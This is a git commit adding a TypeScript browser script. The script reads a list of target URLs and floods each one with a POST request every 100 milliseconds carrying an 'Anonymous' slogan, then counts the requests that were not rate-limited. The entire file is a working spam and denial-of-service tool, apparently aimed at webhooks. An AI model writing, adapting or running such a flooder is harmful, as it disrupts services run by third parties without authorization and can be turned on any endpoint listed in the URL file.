cbabbb254e68d6eeabc6295ec4e61e3a6f944931
PandaNinjas <admin@malwarefight.gq>
2022-05-02 11:30:48 -0700

    Initial commit

---
+++ script.ts
@@ -0,0 +1,40 @@
+let num = parseInt(window.localStorage.getItem("session-counter") || "0");
+let cursessionnum = 0;
+function startSpam(urls: Array<string>) {
+    for (let i = 0; i < urls.length; i++) {
+        setInterval(spam, 100, urls[i]);
+    }
+}
+
+function sync_to_localstorage() {
+    window.localStorage.setItem("session-counter", num.toString());
+}
+
+function spam(url: string) {
+    fetch(
+        url,
+        {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({content: "We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us."})
+        }
+    ).then(
+        (response) => {
+            if (response.status !== 429) {
+                document.getElementById("session-counter").innerText = `We have sent ${++cursessionnum} non-429 requests in this session`;
+                document.getElementById("total-counter").innerText = `We have sent ${++num} non-429 requests in total`;
+            }
+        }
+    )
+}
+
+(async () => {
+    let urls: string = await fetch("urls.txt").then(res => res.text());
+    startSpam(urls.split("\n"));
+})().catch(err => {
+    console.error(err);
+});
+setInterval(sync_to_localstorage, 1000);
